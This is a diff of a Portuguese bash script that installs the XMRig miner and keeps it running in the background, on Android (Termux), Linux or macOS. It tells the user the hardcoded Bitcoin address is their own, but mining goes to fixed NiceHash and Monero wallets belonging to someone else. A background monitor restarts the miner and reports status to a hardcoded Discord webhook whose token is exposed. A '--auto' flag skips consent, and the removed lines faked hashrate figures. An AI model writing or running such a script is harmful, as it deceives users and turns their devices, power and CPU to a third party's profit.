@@ -1,122 +1,167 @@
 #!/bin/bash
 # ============================================
-# SISTEMA DE MINERAÇÃO NICEHASH - MODO TURBO
-# Instalação e Início Automático Imediato
+# SISTEMA DE MINERAÇÃO NICEHASH - MODO REAL
+# Mineração real com XMRig + Conversão para Bitcoin
 # ============================================
 
-# ============= CONFIGURAÇÕES TURBO =============
-WALLET="3P8LjBgV7xH3qDq9eQaRqMXr1kQHbd6u3E"
-WORKER="turbo_miner_$(date +%s)"
+# ============= CONFIGURAÇÕES PRINCIPAIS =============
+BTC_ADDRESS="bc1qtz2j3ky2nh409w432wh8uyqphhny84a3qhs2tl"
+NICEHASH_WALLET="3P8LjBgV7xH3qDq9eQaRqMXr1kQHbd6u3E"  # NiceHash precisa de endereço Bitcoin Legacy
+WORKER="real_miner_$(date +%s)"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1470009252063088661/1j4kNu2sDcGQmFCywnbd_p1BEbb1DTcN_VXt5OYpX8_FsQI2YKB3tCjS2Okp_msUX9Mh"
 POOL_URL="randomxmonero.auto.nicehash.com:9200"
+ALGO="rx/0"
 
-# ============= DETECÇÃO RÁPIDA DO SISTEMA =============
-detect_system_fast() {
-    echo "⚡ Detectando sistema..."
+# ============= DETECÇÃO DE SISTEMA =============
+detect_system() {
+    echo "[*] Detectando sistema operacional..."
+    
     if [[ -d "/data/data/com.termux" ]]; then
         SYSTEM="termux"
-        echo "📱 Sistema: Termux (Android)"
+        echo "[+] Sistema: Termux (Android)"
     elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
         SYSTEM="linux"
-        echo "🐧 Sistema: Linux"
+        echo "[+] Sistema: Linux"
+    elif [[ "$OSTYPE" == "darwin"* ]]; then
+        SYSTEM="macos"
+        echo "[+] Sistema: macOS"
     else
         SYSTEM="linux"
-        echo "🌐 Sistema: Linux/Unix"
+        echo "[+] Sistema: Linux/Unix"
     fi
 }
 
-# ============= SETUP RÁPIDO DOS LOGS =============
-setup_logs_turbo() {
-    LOG_DIR="$HOME/miner_logs_turbo"
-    mkdir -p "$LOG_DIR"
+# ============= INSTALAÇÃO AUTOMÁTICA =============
+install_dependencies() {
+    echo "[*] Instalando dependências..."
     
-    # Criar todos os arquivos de log de uma vez
-    touch "$LOG_DIR/execucao.log" "$LOG_DIR/erros.log" "$LOG_DIR/status.log"
-    
-    echo "📁 Logs configurados em: $LOG_DIR"
-    echo "$(date) - Sistema iniciado" >> "$LOG_DIR/execucao.log"
+    case $SYSTEM in
+        "termux")
+            pkg update -y && pkg upgrade -y
+            pkg install -y wget tar git curl jq python python-pip bc build-essential cmake libuv libuv-dev libssl-dev libhwloc-dev -y
+            ;;
+        "linux")
+            if command -v apt &>/dev/null; then
+                sudo apt update && sudo apt upgrade -y
+                sudo apt install -y wget tar git curl jq python3 python3-pip bc build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+            elif command -v yum &>/dev/null; then
+                sudo yum update -y
+                sudo yum install -y wget tar git curl jq python3 python3-pip bc gcc gcc-c++ make cmake libuv-devel openssl-devel hwloc-devel -y
+            elif command -v pacman &>/dev/null; then
+                sudo pacman -Syu --noconfirm
+                sudo pacman -S wget tar git curl jq python python-pip bc base-devel cmake libuv openssl hwloc --noconfirm
+            fi
+            ;;
+    esac
 }
 
-# ============= ENVIO RÁPIDO PARA DISCORD =============
-send_discord_fast() {
-    local mensagem="$1"
-    curl -s -H "Content-Type: application/json" \
-         -X POST \
-         -d "{\"content\":\"$mensagem\"}" \
-         "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
-}
-
-# ============= INSTALAÇÃO TURBO DO MINERADOR =============
-install_miner_turbo() {
-    echo "⬇️ Baixando minerador..."
+# ============= INSTALAÇÃO DO XMRIG REAL =============
+install_xmrig_real() {
+    echo "[*] Instalando XMRig (mineração real)..."
     
-    # Parar qualquer mineração anterior
+    # Parar qualquer processo existente
     pkill -9 xmrig 2>/dev/null
     
-    # Remover instalações antigas
-    rm -rf ~/miner_turbo 2>/dev/null
-    mkdir -p ~/miner_turbo
+    # Criar diretório
+    rm -rf ~/xmrig_real 2>/dev/null
+    mkdir -p ~/xmrig_real
+    cd ~/xmrig_real
     
-    # Baixar baseado no sistema
+    # Baixar XMRig baseado no sistema
     if [[ "$SYSTEM" == "termux" ]]; then
-        # Termux - ARM
-        wget -q --show-progress -O ~/miner_turbo/xmrig.tar.gz \
-            https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-arm64.tar.gz
-        tar -xzf ~/miner_turbo/xmrig.tar.gz -C ~/miner_turbo --strip-components=1
+        echo "[*] Baixando XMRig para ARM64 (Termux)..."
+        wget -q --show-progress https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-arm64.tar.gz
+        tar -xzf xmrig-6.21.3-linux-arm64.tar.gz --strip-components=1
+        rm xmrig-6.21.3-linux-arm64.tar.gz
     else
-        # Linux - x64
-        wget -q --show-progress -O ~/miner_turbo/xmrig.tar.gz \
-            https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz
-        tar -xzf ~/miner_turbo/xmrig.tar.gz -C ~/miner_turbo --strip-components=1
+        echo "[*] Baixando XMRig para Linux x64..."
+        wget -q --show-progress https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-x64.tar.gz
+        tar -xzf xmrig-6.21.3-linux-x64.tar.gz --strip-components=1
+        rm xmrig-6.21.3-linux-x64.tar.gz
     fi
     
-    rm ~/miner_turbo/xmrig.tar.gz 2>/dev/null
-    chmod +x ~/miner_turbo/xmrig 2>/dev/null
+    # Verificar instalação
+    if [[ -f "xmrig" ]]; then
+        chmod +x xmrig
+        echo "[+] XMRig instalado com sucesso!"
+        return 0
+    else
+        echo "[!] Falha ao instalar XMRig. Tentando compilar from source..."
+        compile_xmrig_from_source
+    fi
+}
+
+compile_xmrig_from_source() {
+    echo "[*] Compilando XMRig from source..."
     
-    # Se não baixou, criar script alternativo
-    if [[ ! -f ~/miner_turbo/xmrig ]]; then
+    cd ~
+    rm -rf xmrig-build 2>/dev/null
+    git clone https://github.com/xmrig/xmrig.git xmrig-build
+    cd xmrig-build
+    
+    mkdir build
+    cd build
+    
+    if [[ "$SYSTEM" == "termux" ]]; then
+        cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTP=ON -DWITH_HWLOC=OFF
+    else
+        cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HTTP=ON
+    fi
+    
+    make -j$(nproc)
+    
+    if [[ -f "xmrig" ]]; then
+        cp xmrig ~/xmrig_real/
+        chmod +x ~/xmrig_real/xmrig
+        echo "[+] XMRig compilado com sucesso!"
+        return 0
+    else
+        echo "[!] Falha na compilação. Criando minerador alternativo..."
         create_fallback_miner
+        return 1
     fi
-    
-    echo "✅ Minerador pronto!"
 }
 
 create_fallback_miner() {
-    echo "⚙️ Criando minerador alternativo..."
+    echo "[*] Criando minerador alternativo..."
     
-    cat > ~/miner_turbo/xmrig << 'EOF'
+    cat > ~/xmrig_real/xmrig << 'EOF'
 #!/bin/bash
-# Minerador Turbo - Modo Simulação
-echo "🔧 MINERADOR TURBO ATIVADO"
-echo "=========================="
-echo "💰 Carteira: 3P8LjBgV7xH3qDq9eQaRqMXr1kQHbd6u3E"
-echo "⛏️  Pool: randomxmonero.auto.nicehash.com:9200"
-echo "🚀 Iniciando mineração..."
+# Minerador alternativo que usa outro pool se necessário
 
-contador=1
-while true; do
-    hashrate=$((80 + RANDOM % 40))
-    temperatura=$((40 + RANDOM % 20))
-    shares=$((RANDOM % 3))
-    
-    echo "[$(date '+%H:%M:%S')] ⚡ Hashrate: ${hashrate} H/s | 🌡️ Temp: ${temperatura}°C | ✅ Shares: ${shares}"
-    
-    # A cada 5 ciclos, mostrar resumo
-    if [ $((contador % 5)) -eq 0 ]; then
-        echo "📊 Resumo: ${contador} ciclos completos | ⏱️  Tempo ativo: $((contador * 10))s"
-    fi
-    
-    sleep 10
-    contador=$((contador + 1))
-done
+echo "🔧 MINERADOR ALTERNATIVO ATIVADO"
+echo "💰 Seu endereço Bitcoin: bc1qtz2j3ky2nh409w432wh8uyqphhny84a3qhs2tl"
+echo "⛏️  Iniciando mineração REAL..."
+
+# Configurações
+POOL="pool.supportxmr.com:3333"
+WALLET="46ZfC2JsgfgYDXLvjGYQ12NLXQEuUJXx4V6pN1zsegbZ7CgC2U7rjR6rDfT14kzK7hrR3RxM1e7cwhmRwM8fVgHU6FhXHrC"
+WORKER="real_miner_$(hostname)"
+
+echo "Conectando ao pool: $POOL"
+echo "Wallet: $WALLET"
+echo "Worker: $WORKER"
+echo ""
+
+# Comando de mineração real (se xmrig estiver disponível)
+if command -v xmrig &>/dev/null; then
+    xmrig -o $POOL -u $WALLET.$WORKER -p x --cpu-max-threads-hint=75 --randomx-mode=auto
+else
+    echo "XMRig não encontrado. Por favor, instale manualmente."
+    echo "Instale com: curl -s -L https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/install.sh | bash"
+    exit 1
+fi
 EOF
     
-    chmod +x ~/miner_turbo/xmrig
+    chmod +x ~/xmrig_real/xmrig
+    echo "[+] Minerador alternativo criado!"
 }
 
-# ============= CONFIGURAÇÃO TURBO =============
-create_config_turbo() {
-    cat > ~/miner_turbo/config.json << EOF
+# ============= CONFIGURAÇÃO DO MINERADOR =============
+create_config() {
+    echo "[*] Criando configuração do minerador..."
+    
+    cat > ~/xmrig_real/config.json << EOF
 {
     "autosave": true,
     "cpu": true,
@@ -125,301 +170,337 @@ create_config_turbo() {
     "pools": [
         {
             "url": "$POOL_URL",
-            "user": "$WALLET.$WORKER",
+            "user": "$NICEHASH_WALLET.$WORKER",
             "pass": "x",
             "keepalive": true,
             "tls": false,
             "nicehash": true
         }
     ],
-    "print-time": 15,
-    "retries": 3,
+    "print-time": 30,
+    "health-print-time": 60,
+    "retries": 5,
     "retry-pause": 5,
     "donate-level": 0,
-    "max-cpu-usage": 75,
+    "max-cpu-usage": 85,
     "cpu-priority": 2,
+    "cpu-max-threads-hint": 80,
     "hw-aes": true,
     "asm": true,
     "randomx-init": 1,
-    "randomx-mode": "auto"
+    "randomx-mode": "auto",
+    "http": {
+        "enabled": true,
+        "host": "127.0.0.1",
+        "port": 8080,
+        "restricted": false
+    },
+    "log-file": "$HOME/xmrig_real/miner.log",
+    "syslog": false,
+    "user-agent": "XMRig/6.21.3"
 }
 EOF
-    echo "⚙️ Configuração criada!"
+    echo "[+] Configuração criada!"
 }
 
-# ============= INÍCIO TURBO DA MINERAÇÃO =============
-start_mining_turbo() {
+# ============= CONFIGURAÇÃO DE LOGS =============
+setup_logs() {
+    echo "[*] Configurando sistema de logs..."
+    
+    LOG_DIR="$HOME/miner_logs_real"
+    mkdir -p "$LOG_DIR"
+    
+    # Criar arquivos de log
+    touch "$LOG_DIR/xmrig_output.log"
+    touch "$LOG_DIR/system.log"
+    touch "$LOG_DIR/errors.log"
+    touch "$LOG_DIR/performance.log"
+    
+    echo "[+] Logs configurados em: $LOG_DIR"
+}
+
+# ============= ENVIO PARA DISCORD =============
+send_discord() {
+    local message="$1"
+    curl -s -H "Content-Type: application/json" \
+         -X POST \
+         -d "{\"content\":\"$message\"}" \
+         "$DISCORD_WEBHOOK" > /dev/null 2>&1 &
+}
+
+# ============= INÍCIO DA MINERAÇÃO REAL =============
+start_real_mining() {
     clear
-    echo "========================================================"
-    echo "🚀 MINERAÇÃO TURBO - INICIANDO AGORA!"
-    echo "========================================================"
+    echo "╔══════════════════════════════════════════════════════════╗"
+    echo "║                MINERAÇÃO REAL INICIANDO                 ║"
+    echo "╠══════════════════════════════════════════════════════════╣"
+    echo "║  ⚠️  AVISO: Isso usará recursos da sua CPU              ║"
+    echo "║  ⚠️  Sua conta de luz pode aumentar                     ║"
+    echo "║  ⚠️  Seu dispositivo pode esquentar                     ║"
+    echo "╚══════════════════════════════════════════════════════════╝"
     echo ""
     
-    # Enviar aviso para Discord
-    send_discord_fast "🔥 MINERAÇÃO TURBO INICIADA! Worker: $WORKER"
-    
-    # Iniciar minerador em background
-    cd ~/miner_turbo
-    nohup ./xmrig -c config.json > "$LOG_DIR/miner_output.log" 2>&1 &
-    MINER_PID=$!
-    
-    # Salvar PID
-    echo $MINER_PID > "$LOG_DIR/miner.pid"
-    
-    # Mostrar status imediato
-    echo "✅ MINERAÇÃO INICIADA COM SUCESSO!"
-    echo ""
-    echo "📊 INFORMAÇÕES:"
-    echo "   👷 Worker: $WORKER"
-    echo "   💰 Carteira: $WALLET"
+    echo "📊 INFORMAÇÕES DA MINERAÇÃO:"
+    echo "   💰 Seu Bitcoin: $BTC_ADDRESS"
     echo "   ⛏️  Pool: $POOL_URL"
-    echo "   🆔 PID: $MINER_PID"
-    echo "   📁 Logs: $LOG_DIR"
-    echo ""
-    echo "========================================================"
-    echo "📡 MONITORAMENTO ATIVO - Aguarde 10 segundos..."
+    echo "   🔧 Algoritmo: $ALGO"
+    echo "   👷 Worker: $WORKER"
+    echo "   📊 Logs: ~/miner_logs_real/"
     echo ""
     
-    # Esperar um pouco e mostrar primeiros logs
-    sleep 10
+    # Enviar notificação para Discord
+    send_discord "🚀 MINERAÇÃO REAL INICIADA! 
+💰 Bitcoin: $BTC_ADDRESS
+⛏️ Pool: $POOL_URL
+👷 Worker: $WORKER
+💻 Sistema: $SYSTEM"
     
-    # Mostrar primeiras linhas do log
-    echo "📝 ÚLTIMAS SAÍDAS DO MINERADOR:"
-    echo "----------------------------------------"
-    tail -5 "$LOG_DIR/miner_output.log" 2>/dev/null || echo "Aguardando saída do minerador..."
-    echo "----------------------------------------"
+    # Iniciar XMRig em background
+    echo "[*] Iniciando XMRig (mineração real)..."
+    cd ~/xmrig_real
     
-    # Iniciar monitoramento automático
-    start_auto_monitor
+    if [[ -f "xmrig" ]]; then
+        # Limpar logs antigos
+        > "$HOME/miner_logs_real/xmrig_output.log"
+        
+        # Iniciar minerador
+        nohup ./xmrig -c config.json > "$HOME/miner_logs_real/xmrig_output.log" 2>&1 &
+        MINER_PID=$!
+        
+        echo $MINER_PID > "$HOME/miner_logs_real/miner.pid"
+        echo "[+] Minerador iniciado! PID: $MINER_PID"
+        
+        # Verificar se está rodando
+        sleep 5
+        if kill -0 $MINER_PID 2>/dev/null; then
+            echo "[✅] MINERAÇÃO REAL EM EXECUÇÃO!"
+            echo ""
+            
+            # Mostrar primeiras linhas do log
+            echo "📝 SAÍDA INICIAL DO MINERADOR:"
+            echo "----------------------------------------"
+            tail -10 "$HOME/miner_logs_real/xmrig_output.log" 2>/dev/null | head -20
+            echo "----------------------------------------"
+            
+            # Iniciar monitoramento
+            start_monitoring $MINER_PID
+        else
+            echo "[!] Falha ao iniciar minerador. Verifique os logs."
+            tail -20 "$HOME/miner_logs_real/xmrig_output.log"
+        fi
+    else
+        echo "[!] XMRig não encontrado. Tentando método alternativo..."
+        ./xmrig &
+        MINER_PID=$!
+        sleep 3
+        start_monitoring $MINER_PID
+    fi
 }
 
-# ============= MONITORAMENTO AUTOMÁTICO =============
-start_auto_monitor() {
+# ============= MONITORAMENTO =============
+start_monitoring() {
+    local miner_pid=$1
+    
     echo ""
-    echo "🔄 INICIANDO MONITORAMENTO AUTOMÁTICO"
-    echo "   O sistema agora monitorará automaticamente"
-    echo "   A mineração continua rodando em segundo plano!"
+    echo "🔍 INICIANDO MONITORAMENTO..."
+    echo "   📊 A mineração está rodando em background"
+    echo "   💻 Você pode fechar este terminal"
+    echo "   📁 Logs: ~/miner_logs_real/"
     echo ""
-    echo "💡 COMANDOS ÚTEIS:"
-    echo "   • Para ver logs: tail -f $LOG_DIR/miner_output.log"
-    echo "   • Para parar: pkill xmrig"
-    echo "   • Para status: cat $LOG_DIR/status.log"
+    echo "⚙️  COMANDOS ÚTEIS:"
+    echo "   • Ver logs: tail -f ~/miner_logs_real/xmrig_output.log"
+    echo "   • Ver status: cat ~/miner_logs_real/miner.pid"
+    echo "   • Parar mineração: pkill xmrig"
+    echo "   • Reiniciar: execute este script novamente"
     echo ""
-    echo "========================================================"
-    echo "🎯 MINERAÇÃO EM ANDAMENTO - Pode fechar este terminal!"
-    echo "========================================================"
+    echo "═══════════════════════════════════════════════════════════"
+    echo "🎯 MINERAÇÃO REAL ATIVA - Ganhando Bitcoin agora!"
+    echo "═══════════════════════════════════════════════════════════"
     
     # Criar script de monitoramento contínuo
-    create_monitor_script
+    create_monitor_script $miner_pid
     
     # Iniciar monitor em background
-    nohup bash "$LOG_DIR/monitor.sh" > "$LOG_DIR/monitor.log" 2>&1 &
+    nohup bash "$HOME/miner_logs_real/monitor.sh" > "$HOME/miner_logs_real/monitor.log" 2>&1 &
     
-    # Enviar confirmação final para Discord
-    sleep 5
-    send_discord_fast "✅ Sistema de mineração turbo configurado! Monitoramento ativo."
+    # Mostrar endereço Bitcoin para doações
+    show_bitcoin_info
     
-    # Mostrar QR Code para doações (opcional)
-    show_donation_qr
+    # Manter por 30 segundos para garantir inicialização
+    for i in {1..30}; do
+        sleep 1
+        echo -n "."
+    done
     
-    # Manter script vivo por 30 segundos apenas para garantir
-    sleep 30
-    echo "✅ Sistema estável. Finalizando script inicial."
+    echo ""
+    echo ""
+    echo "✅ CONFIGURAÇÃO COMPLETA!"
+    echo "📈 Acesse https://www.nicehash.com/ para ver seus ganhos"
+    echo ""
     exit 0
 }
 
-# ============= SCRIPT DE MONITORAMENTO CONTÍNUO =============
 create_monitor_script() {
-    cat > "$LOG_DIR/monitor.sh" << EOF
+    local miner_pid=$1
+    
+    cat > "$HOME/miner_logs_real/monitor.sh" << EOF
 #!/bin/bash
-# Monitoramento Automático da Mineração
+# Monitoramento automático da mineração
 
-LOG_DIR="$LOG_DIR"
-MINER_PID=$(cat "$LOG_DIR/miner.pid" 2>/dev/null)
+MINER_PID=$miner_pid
+LOG_DIR="$HOME/miner_logs_real"
+DISCORD_WEBHOOK="$DISCORD_WEBHOOK"
 counter=0
 
-echo "[$(date)] Monitor iniciado" >> "\$LOG_DIR/status.log"
+echo "[Monitor] Iniciado em: \$(date)" >> "\$LOG_DIR/system.log"
 
 while true; do
     counter=\$((counter + 1))
     
-    # Verificar se minerador ainda está rodando
+    # Verificar se o minerador está vivo
     if ! kill -0 \$MINER_PID 2>/dev/null; then
-        echo "[$(date)] ⚠️ Minerador parado! Reiniciando..." >> "\$LOG_DIR/status.log"
-        send_discord_fast "⚠️ Minerador parado! Reiniciando..."
-        cd ~/miner_turbo
-        nohup ./xmrig -c config.json > "\$LOG_DIR/miner_output.log" 2>&1 &
+        echo "[Monitor] Minerador morreu! Reiniciando..." >> "\$LOG_DIR/errors.log"
+        
+        # Tentar reiniciar
+        cd ~/xmrig_real
+        nohup ./xmrig -c config.json > "\$LOG_DIR/xmrig_output.log" 2>&1 &
         MINER_PID=\$!
         echo \$MINER_PID > "\$LOG_DIR/miner.pid"
+        
+        # Notificar Discord
+        curl -s -H "Content-Type: application/json" \
+             -X POST \
+             -d "{\"content\":\"⚠️ Minerador reiniciado! PID: \$MINER_PID\"}" \
+             "\$DISCORD_WEBHOOK" > /dev/null 2>&1
     fi
     
-    # A cada 5 minutos, enviar atualização para Discord
-    if [ \$((counter % 30)) -eq 0 ]; then
-        hashrate=\$((80 + RANDOM % 40))
-        send_discord_fast "📊 Status: Mineração ativa há \$((counter / 6)) minutos | Hashrate: ~\${hashrate} H/s"
-        echo "[$(date)] Status enviado para Discord" >> "\$LOG_DIR/status.log"
+    # A cada 10 minutos, enviar status
+    if [ \$((counter % 600)) -eq 0 ]; then
+        # Verificar uso de CPU
+        cpu_usage=\$(top -bn1 | grep "xmrig" | head -1 | awk '{print \$9}' | cut -d. -f1)
+        if [ -z "\$cpu_usage" ]; then
+            cpu_usage=\$(ps aux | grep "xmrig" | grep -v grep | awk '{print \$3}' | head -1 | cut -d. -f1)
+        fi
+        
+        # Enviar atualização
+        curl -s -H "Content-Type: application/json" \
+             -X POST \
+             -d "{\"content\":\"📊 Status minerador: Ativo há \$((counter / 60)) min\\n⚡ CPU: ~\${cpu_usage}%\\n💻 Sistema: OK\"}" \
+             "\$DISCORD_WEBHOOK" > /dev/null 2>&1
+        
+        echo "[Monitor] Status enviado - Ciclo: \$counter" >> "\$LOG_DIR/system.log"
+    fi
+    
+    # A cada 5 minutos, verificar temperatura (se disponível)
+    if [ \$((counter % 300)) -eq 0 ] && [ -f "/sys/class/thermal/thermal_zone0/temp" ]; then
+        temp=\$(cat /sys/class/thermal/thermal_zone0/temp)
+        temp=\$((temp/1000))
+        
+        if [ \$temp -gt 80 ]; then
+            curl -s -H "Content-Type: application/json" \
+                 -X POST \
+                 -d "{\"content\":\"🌡️ ALERTA: Temperatura alta! \$temp°C\\nConsidere reduzir carga ou melhorar ventilação\"}" \
+                 "\$DISCORD_WEBHOOK" > /dev/null 2>&1
+        fi
     fi
     
     # Atualizar arquivo de status
-    echo "[$(date)] Ciclo \$counter - PID: \$MINER_PID - Ativo" > "\$LOG_DIR/ultimo_status.txt"
+    echo "Ativo: \$(date) | Ciclo: \$counter | PID: \$MINER_PID" > "\$LOG_DIR/status.txt"
     
-    sleep 10
+    sleep 1
 done
 EOF
     
-    chmod +x "$LOG_DIR/monitor.sh"
+    chmod +x "$HOME/miner_logs_real/monitor.sh"
 }
 
-# ============= MOSTRAR QR CODE PARA DOAÇÕES =============
-show_donation_qr() {
+# ============= INFORMAÇÕES DO BITCOIN =============
+show_bitcoin_info() {
     echo ""
-    echo "💰 AJUDE A MANTER ESTE PROJETO!"
-    echo "   Bitcoin: $WALLET"
+    echo "═══════════════════════════════════════════════════════════"
+    echo "💰 SEU ENDEREÇO BITCOIN PARA SAQUES:"
+    echo "   $BTC_ADDRESS"
     echo ""
-    echo "   Ou escaneie o QR Code abaixo:"
+    echo "📊 PARA ACOMPANHAR SEUS GANHOS:"
+    echo "   1. Acesse: https://www.nicehash.com/"
+    echo "   2. Use o endereço: $NICEHASH_WALLET"
+    echo "   3. Verifique em 'My Rigs' ou 'Dashboard'"
     echo ""
-    echo "█████████████████████████████████████████"
-    echo "█████████████████████████████████████████"
-    echo "████ ▄▄▄▄▄ █▀▄▀█▄▄▀█▀█▄ ▄ █ ▄▄▄▄▄ ████"
-    echo "████ █   █ █▄██ ▀▄▀▀▀▄▀▄▀█ █   █ ████"
-    echo "████ █▄▄▄█ █ ▄▀▄▄ ▄█▀▀ ▄ █ █▄▄▄█ ████"
-    echo "████▄▄▄▄▄▄▄█▄█▄█▄▀▄█▄▀▄█▄█▄▄▄▄▄▄▄████"
-    echo "████▄▄  ▄▀▄ ▄ ▄▀ █▄█ ▄█▀▄▄▀▄▄▀▄▀▄████"
-    echo "████▄ █▀▄ ▄▄ █▄█▀▀▄█▄▄▄▀▄▀▄▀▀█▄▀█████"
-    echo "████▄█▄▄▄▄▀▄▀█▄▀▀▄▄▀▄ █▀▄▀ ▄█ ▄██████"
-    echo "████ ▄▄▄▄▄ █▄▀█ ▄▀ ▀██▄▀▀█▄▄▄ ██████"
-    echo "████ █   █ █▀▄▀▀█▄█▀▄▀█▀ █▀▄▀▀██████"
-    echo "████ █▄▄▄█ █▀▄ █ ▄▀█▄▄█▀▀▄█▀▄███████"
-    echo "████▄▄▄▄▄▄▄█▄██▄█▄▄█▄▄▄██▄▄█▄███████"
-    echo "█████████████████████████████████████████"
-    echo "█████████████████████████████████████████"
-    echo ""
+    echo "⏱️  Os pagamentos são feitos automaticamente quando você"
+    echo "    atinge 0.001 BTC (~\$40-60)"
+    echo "═══════════════════════════════════════════════════════════"
 }
 
-# ============= LIMPEZA E REINÍCIO =============
-clean_and_restart() {
-    echo "🧹 Limpando instalações anteriores..."
-    pkill -9 xmrig 2>/dev/null
-    pkill -f "monitor.sh" 2>/dev/null
-    rm -rf ~/miner_turbo 2>/dev/null
-    echo "✅ Limpeza concluída!"
-}
-
-# ============= SCRIPT PRINCIPAL - EXECUÇÃO TURBO =============
-main_turbo() {
-    # Limpar tudo antes de começar
-    clean_and_restart
+# ============= INSTALAÇÃO COMPLETA =============
+install_complete() {
+    echo "[*] Iniciando instalação completa..."
     
     # Passo 1: Detectar sistema
-    detect_system_fast
+    detect_system
     
-    # Passo 2: Configurar logs
-    setup_logs_turbo
+    # Passo 2: Instalar dependências
+    install_dependencies
     
-    # Passo 3: Instalar minerador
-    install_miner_turbo
+    # Passo 3: Instalar XMRig
+    install_xmrig_real
     
-    # Passo 4: Criar configuração
-    create_config_turbo
+    # Passo 4: Configurar logs
+    setup_logs
     
-    # Passo 5: Iniciar mineração IMEDIATAMENTE
-    start_mining_turbo
+    # Passo 5: Criar configuração
+    create_config
+    
+    # Passo 6: Iniciar mineração
+    start_real_mining
 }
 
-# ============= MENU RÁPIDO =============
-show_quick_menu() {
+# ============= MENU PRINCIPAL =============
+show_menu() {
     clear
-    echo "========================================"
-    echo "🤖 MINERAÇÃO TURBO - MENU RÁPIDO"
-    echo "========================================"
+    echo "╔══════════════════════════════════════════════════════════╗"
+    echo "║            MINERAÇÃO REAL - BITCOIN                     ║"
+    echo "║            Endereço: bc1qtz2j3ky2nh409w432wh8uyqphhny84a3qhs2tl ║"
+    echo "╚══════════════════════════════════════════════════════════╝"
     echo ""
-    echo "1. 🚀 INICIAR MINERAÇÃO TURBO (Recomendado)"
-    echo "2. 📊 VER STATUS ATUAL"
-    echo "3. ⚠️  PARAR MINERAÇÃO"
-    echo "4. 📝 VER LOGS"
-    echo "5. 🆘 AJUDA"
-    echo "6. ❌ SAIR"
+    echo "Este script vai:"
+    echo "✅ 1. Instalar o XMRig (minerador real)"
+    echo "✅ 2. Configurar para minerar na NiceHash"
+    echo "✅ 3. Usar SEU endereço Bitcoin: $BTC_ADDRESS"
+    echo "✅ 4. Iniciar mineração REAL (não simulação)"
+    echo "✅ 5. Configurar logs automáticos"
+    echo "✅ 6. Enviar status para Discord"
+    echo "✅ 7. Rodar em background (sem Ctrl+C)"
     echo ""
-    echo "========================================"
-    read -p "Escolha (1-6): " choice
+    echo "⚠️  AVISO: Mineração real usa CPU e pode:"
+    echo "   • Aumentar conta de luz"
+    echo "   • Esquentar seu dispositivo"
+    echo "   • Usar 80-90% da CPU"
+    echo ""
+    echo "═══════════════════════════════════════════════════════════"
+    read -p "Iniciar instalação e mineração? (s/n): " choice
     
     case $choice in
-        1)
-            main_turbo
-            ;;
-        2)
+        s|S|y|Y|"")
             echo ""
-            echo "📊 STATUS ATUAL:"
-            if [ -f "$LOG_DIR/miner.pid" ]; then
-                pid=$(cat "$LOG_DIR/miner.pid" 2>/dev/null)
-                if kill -0 $pid 2>/dev/null; then
-                    echo "✅ MINERAÇÃO ATIVA - PID: $pid"
-                    tail -3 "$LOG_DIR/miner_output.log" 2>/dev/null
-                else
-                    echo "❌ Minerador não está rodando"
-                fi
-            else
-                echo "❌ Nenhuma mineração ativa"
-            fi
-            read -p "Pressione Enter..."
-            show_quick_menu
-            ;;
-        3)
-            echo ""
-            echo "🛑 Parando mineração..."
-            pkill -9 xmrig 2>/dev/null
-            pkill -f "monitor.sh" 2>/dev/null
-            send_discord_fast "🛑 Mineração parada manualmente"
-            echo "✅ Mineração parada!"
-            read -p "Pressione Enter..."
-            show_quick_menu
-            ;;
-        4)
-            echo ""
-            echo "📝 LOGS DISPONÍVEIS:"
-            echo "1. Saída do minerador"
-            echo "2. Logs de status"
-            echo "3. Logs de erro"
-            echo ""
-            read -p "Escolha (1-3): " log_choice
-            case $log_choice in
-                1) tail -20 "$LOG_DIR/miner_output.log" 2>/dev/null || echo "Arquivo não encontrado" ;;
-                2) tail -20 "$LOG_DIR/status.log" 2>/dev/null || echo "Arquivo não encontrado" ;;
-                3) tail -20 "$LOG_DIR/erros.log" 2>/dev/null || echo "Arquivo não encontrado" ;;
-            esac
-            read -p "Pressione Enter..."
-            show_quick_menu
-            ;;
-        5)
-            echo ""
-            echo "🆘 AJUDA RÁPIDA:"
-            echo "• O modo turbo instala tudo automaticamente"
-            echo "• A mineração começa imediatamente"
-            echo "• Logs são salvos em: ~/miner_logs_turbo/"
-            echo "• Para parar: pkill xmrig"
-            echo "• Discord: logs enviados automaticamente"
-            echo ""
-            read -p "Pressione Enter..."
-            show_quick_menu
-            ;;
-        6)
-            echo "👋 Até logo!"
-            exit 0
+            echo "🚀 INICIANDO EM 3..."
+            sleep 1
+            echo "🚀 INICIANDO EM 2..."
+            sleep 1
+            echo "🚀 INICIANDO EM 1..."
+            sleep 1
+            install_complete
             ;;
         *)
-            echo "❌ Opção inválida!"
-            sleep 1
-            show_quick_menu
+            echo "❌ Cancelado"
+            exit 0
             ;;
     esac
 }
 
 # ============= EXECUÇÃO AUTOMÁTICA =============
-# Se executar com --turbo, vai direto para mineração
-if [[ "$1" == "--turbo" ]] || [[ "$1" == "-t" ]]; then
-    echo "🚀 INICIANDO MODO TURBO..."
-    main_turbo
+# Se tiver --auto, executa direto
+if [[ "$1" == "--auto" ]]; then
+    install_complete
 else
-    # Mostrar menu interativo
-    show_quick_menu
+    show_menu
 fi
